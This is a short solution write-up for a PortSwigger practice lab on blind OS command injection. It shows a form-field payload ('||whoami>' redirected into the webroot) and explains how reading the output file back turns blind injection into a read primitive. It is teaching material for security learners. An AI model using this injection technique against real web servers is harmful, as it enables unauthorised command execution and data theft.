# Lab 03 — Blind OS command injection with output redirection

> **Practitioner** · [Official lab](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

**Entry point:** `POST /feedback` — vulnerable `email` field, blind — but the
webroot is writable and served.

## Solution

1. Redirect command output into a file under the webroot, then read it:

```
email=||whoami>/var/www/images/whoami.txt||
```

2. Load `/image?filename=whoami.txt` — the image server returns the file's
   contents: `carlos` — lab solved.

## Notes

- `||` (not `|`) so the injected command runs unconditionally after the
  failed email value.
- Exfiltration-via-webroot turns any blind command injection into an
  in-band read primitive.
